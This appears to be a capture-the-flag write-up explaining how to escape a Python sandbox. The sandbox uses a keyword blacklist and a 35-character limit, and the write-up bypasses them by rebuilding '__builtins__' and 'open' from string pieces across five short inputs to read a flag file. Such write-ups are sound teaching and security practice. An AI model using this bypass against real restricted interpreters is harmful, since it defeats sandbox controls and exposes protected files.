# Writeup — Python Jail Escape

## Vulnerability Analysis

The Python sandbox (`server.py`) implements a standard blacklist filter and a strict input length limit:
1. Blocked words: `['os', 'sys', 'import', 'eval', 'exec', 'subprocess', 'system', '__builtins__', '__class__', '__dict__', 'compile', 'open']`
2. Max command length: **35 characters**.

To capture the flag, we need to read `/app/flag.txt` under these constraints.

---

## Exploitation (Sandbox Bypass)

1. **Reconstructing Blocked Keywords**:
   Since the string `'__builtins__'` and `'open'` are blacklisted, we cannot reference them directly. However, we can use string concatenation to build them dynamically at runtime without triggering the keyword filter:
   - `b = '__built' + 'ins__'`
   - `o = 'op' + 'en'`

2. **Accessing Builtins via Globals**:
   In Python, the `globals()` function is not blocked and returns the current namespace dictionary. Because the script executes inside an custom `exec()` context, Python automatically initializes `__builtins__` inside the globals dictionary.
   
   We can fetch it as:
   ```python
   g = globals()
   builtins_dict = g[b]
   open_func = builtins_dict[o]
   ```

3. **Bypassing the 35-character Length Limit**:
   To stay under the 35-character threshold, we split the reconstruction and execution across multiple inputs, since the interactive socket shell stores variable states in memory between prompts:
   
   * **Input 1**: Get globals dict:
     ```python
     g=globals()
     ```
     *(11 chars)*
     
   * **Input 2**: Reconstruct builtins key:
     ```python
     b='__built'+'ins__'
     ```
     *(19 chars)*
     
   * **Input 3**: Reconstruct open key:
     ```python
     o='op'+'en'
     ```
     *(11 chars)*
     
   * **Input 4**: Pull open function reference:
     ```python
     f=g[b][o]
     ```
     *(9 chars)*
     
   * **Input 5**: Open and read the flag:
     ```python
     print(f('flag.txt').read())
     ```
     *(27 chars)*

All inputs comply with the length constraint and contain no forbidden keywords, allowing us to read `/app/flag.txt` successfully.
